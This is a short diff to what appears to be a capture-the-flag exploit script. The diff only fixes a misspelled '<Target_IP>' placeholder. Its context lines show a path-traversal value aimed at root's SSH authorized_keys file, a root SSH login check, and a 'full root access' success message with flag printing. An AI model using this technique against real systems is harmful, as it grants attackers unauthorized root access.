@@ -47,7 +47,7 @@ def exploit_path_traversal():
     print("[*] Exploiting install_validator.py...")
     print("[*] Using path traversal: %2Froot%2F.ssh%2Fauthorized_keys")
     
-    RHOST = "<Tareget_IP>"
+    RHOST = "<Target_IP>"
     LHOST = "<Your_IP_Address>"
     
     cmd = [
@@ -74,7 +74,7 @@ def verify_root_ssh():
     """Verify SSH access as root"""
     print("[*] Testing SSH as root...")
     
-    RHOST = "<Tareget_IP>"
+    RHOST = "<Target_IP>"
     
     # Test connection
     result = subprocess.run(
@@ -122,7 +122,7 @@ def main():
             print("EXPLOITATION COMPLETE!")
             print("="*60)
             print("\n[+] You now have full root access!")
-            print("    ssh -i /tmp/root_key root@<Tareget_IP>")
+            print("    ssh -i /tmp/root_key root@<Target_IP>")
             
             # Print both flags
             try:
